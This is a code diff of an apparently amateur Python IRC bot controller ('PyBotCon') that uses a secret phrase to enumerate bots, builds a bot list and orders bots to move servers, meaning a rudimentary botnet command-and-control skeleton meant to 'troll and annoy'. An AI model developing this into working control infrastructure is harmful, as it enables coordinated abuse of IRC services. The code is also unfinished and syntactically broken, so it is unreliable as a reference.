@@ -5,11 +5,19 @@ import socket
 import random
 import string
 
-class PyBot:
+class PyBotCon:
+# NOTES --> Have to thread a listener into this program to listen for responses in a while(True) loop
+# NOTES --> Data collected from the listener thread has to be responded to appropriately
+#             Bot responses to the secret need to populate a botList when appropriate
+#             Bots need to respond to commands appropriately, and the thread needs to check flags to listen for these responses
+# NOTES --> Commands from the user behind the conbot need to be able to input commands while the listener is collecting data
+# Need to wait for 5 seconds then parse input from s.recv as long as s has data in it
+# In the 5 seconds of wait time the socket will cache the data it receives
+# After wait time (or before) the program will prompt for user input
   #PyBot object constructor 
   def __init__(self,host,port,channel,secret,s):
 
-    #Create PyBot instanace variables
+    #Create PyBotCon instanace variables
     self.host = host
     self.port = port
     self.channel = channel
@@ -50,14 +58,14 @@ class PyBot:
       print("DEBUG --> Controller said the secret! Control Mode enabled, read to troll and annoy")
       self.control = 1
 
-  def changeChannel(self,newChannel):
-    print("DEBUG --> Changing channel")     
+  def changeChannel(self,channel,newServer, newChannel):
+    self.s.send(bytes("PRIVMSG" + channel + " " + "move " + newServer + " " + newChannel + "\n"))  
 
   def identifyBots(self,secret,channel):
     self.s.send(bytes("PRIVMSG " + channel + " " + secret + "\n")) # Send 'hello' message for bots to identify themselves
     self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
-    for(i in range(5000)): # NOTE --> I'm not sure how long I should be listening for bot replies, this may need to be adjusted
-      data = self.s.recv(2048).decode("UTF-8")
+    for(i in range(100)): # NOTE --> I'm not sure how long I should be listening for bot replies, this may need to be adjusted
+      data = self.s.recv(1024).decode("UTF-8")
       data = data.strip("\r\n")
       if(data.find("PRIVMSG {} :".format(self.nick))!=-1 and data.split("PRIVMSG",1)[1].split(":",1)[1]=="YOURS"): # NOTE --> The response message that we're expecting from bots is "YOURS"
         temp = data.split("!",1)[0][1:] # Finds name of the bot reply
@@ -77,7 +85,7 @@ if __name__ == '__main__':
     sys.exit("Usage: bot <hostname> <port> <channel> <secret-phrase>")
 
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  conBot = PyBot(host,port,channel,secret,s) #Create an instance of the bot 
+  conBot = PyBotCon(host,port,channel,secret,s) #Create an instance of the bot 
   
 
 
